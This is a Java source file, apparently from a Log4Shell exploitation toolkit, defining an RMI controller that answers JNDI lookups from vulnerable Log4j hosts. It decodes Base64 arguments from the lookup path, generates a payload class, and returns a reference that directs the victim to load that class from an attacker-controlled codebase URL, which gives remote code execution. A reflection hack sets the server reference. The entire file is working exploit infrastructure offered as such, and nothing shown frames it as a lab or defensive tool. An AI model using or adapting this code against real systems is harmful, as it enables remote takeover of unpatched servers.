package es.malvarez.log4shell.malicious.rmi;

import com.sun.jndi.rmi.registry.ReferenceWrapper;
import es.malvarez.log4shell.malicious.MaliciousProperties;
import es.malvarez.log4shell.malicious.payload.Payload;
import es.malvarez.log4shell.malicious.payload.PayloadGenerator;
import es.malvarez.log4shell.malicious.payload.PayloadType;
import es.malvarez.log4shell.malicious.util.Base64Utils;
import lombok.RequiredArgsConstructor;
import lombok.extern.log4j.Log4j2;
import sun.rmi.server.UnicastServerRef;

import javax.naming.Reference;
import java.lang.reflect.Field;
import java.net.URL;
import java.rmi.server.RemoteObject;
import java.util.Arrays;

@Log4j2
@RequiredArgsConstructor
@RmiRoute(route = "payload")
public class RmiPayloadController implements RmiController {

    private final MaliciousProperties properties;

    private final PayloadGenerator payloadGenerator;

    @Override
    public ReferenceWrapper buildReference(final String object) throws Exception {
        String[] params = object.split("/");
        PayloadType type = PayloadType.fromName(params[1]);
        String[] args = Arrays.stream(params).skip(2).map(Base64Utils::fromBase64).toArray(String[]::new);
        Payload payload = payloadGenerator.getPayload(type, args);
        log.info("Rmi result for {} redirect to {}",
                String.join(", ", params),
                properties.getCodeBase() + payload.getClassName() + ".class");

        URL codebase = this.properties.getCodeBase();
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(
                new Reference(type.name(), payload.getClassName(), codebase.toString()));
        Field refField = RemoteObject.class.getDeclaredField("ref");
        refField.setAccessible(true);
        refField.set(referenceWrapper, new UnicastServerRef(12345));
        return referenceWrapper;
    }
}
